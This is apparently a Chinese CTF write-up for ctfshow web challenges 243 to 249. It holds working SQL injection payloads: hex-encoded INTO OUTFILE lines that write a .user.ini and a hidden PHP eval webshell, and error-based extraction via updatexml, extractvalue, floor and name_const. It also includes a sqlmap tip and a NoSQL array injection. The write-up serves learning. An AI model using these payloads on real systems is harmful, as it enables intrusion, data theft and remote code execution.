+太菜了，一直没传对，问了问群主，这题上传`.user.ini`解析图片就行，上传URL：`URL/api/dump.php`，进制内容自行转换查看
+
+`.user.ini`的payload：`filename=.user.ini' lines starting by ';' terminated by 0x0A6175746F5F70726570656E645F66696C653D7971316E672E6A70670A6175746F5F617070656E645F66696C653D7971316E672E6A70670A;--+`
+
+`yq1ng.jpg`的payload：`filename=yq1ng.jpg' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27;--+`
+
+最后在`URL/dump/index.php`下蚁剑链接即可
+
+## web244
+报错注入，无过滤\
+sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`
+
+payload：`URL/api/?id=1' and (updatexml(1,concat(0x7e,(select right(flag,30) from ctfshow_flag),0x7e),1));%23`\
+注意：报错最大长度为32位，需要配合截取函数使用
+
+原理：
+>`updatexml (XML_document, XPath_string, new_value); ` --> 改变文档中符合条件的节点的值\
+参数介绍：
+>- 第一个参数：`XML_document`是String格式，为XML文档对象的名称，文中为Doc
+>- 第二个参数：`XPath_string` (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+>- 第三个参数：`new_value`，String格式，替换查找到的符合条件的数据
+
+>报错原理：\
+第二个参数`XPath_string`，如果传入的的不是XPath格式就会报错\
+为什么要使用concat 这个函数呢，因为它是个连接函数你不用的话(updatexml(1,(select user()),1)) 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到concat用特殊字符给他连接起来
+
+## web245
+sql: `$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`\
+过滤`updatexml`，报错姿势很多的\
+payload：`URL/api/?id=1' and (extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)))%23`
+
+原理：
+>`extractValue(xml_frag, xpath_expr)` --> 使用XPath表示法从XML字符串中提取值\
+参数介绍：
+>- 第一个参数可以传入目标xml文档
+>- 第二个参数是用Xpath路径法表示的查找路径
+
+原理同上
+
+## web246
+sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`
+
+过滤：`updatexml` `extractvalue`
+
+floor报错，原理在另外一篇博客，[点此进入](https://yq1ng.github.io/z_post/%E9%87%8D%E5%90%AF%EF%BC%8CSQLi-labs-GET/#less-6-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)，注意，子查询返回只能为1行
+
+爆表：`URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`
+
+flag列：`api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name="ctfshow_flags" limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`
+
+因为ctfshow_flags表只有一行，就不limit了：`URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`
+
+## web247
+猜着就会过滤floor哈哈哈\
+sql: `$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`
+
+过滤：`updatexml` `extractvalue` `floor`
+
+。。。12种报错全试了，一会再来\
+只得试出数据库版本`URL/api/?id=1' and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);%23`\
+盲！盲注yyds，前面的脚本随便改个，可以说是无过滤(脚本没跑成，用了sqlmap，脚本未成的原因是列名字典我没加`?`。。。)，当然，sqlmap也行，记得加上请求头`--user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"`
+
+## web248
+udf注入，这个真是第一次听说，Google一番也是不会，只知道是利用MySQL提权的，用的翅膀大佬的脚本，只能说tttttqqqqql，翅膀师傅的脚本注释也写得很明白，永存了，膜
+
+## web249
+sql：emm忘了写，下次一定\
+无waf\
+[MongoDB 教程](https://www.runoob.com/mongodb/mongodb-tutorial.html)\
+[NoSQL注入小笔记](http://rui0.cn/archives/609)
+>常见的条件操作符：
+```
+$gt : >
+$lt : <
+$gte: >=
+$lte: <=
+$ne : !=、<>
+$in : in
+$nin: not in
+$all: all 
+$or:or
+$not: 反匹配(1.3.3及以上版本)
+模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
+/**
+* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
+* : $ne { "age" : { "$ne" : 23}}
+* : $lt { "age" : { "$lt" : 23}}
+*/
+```
+
+payload：`?id[]=flag`
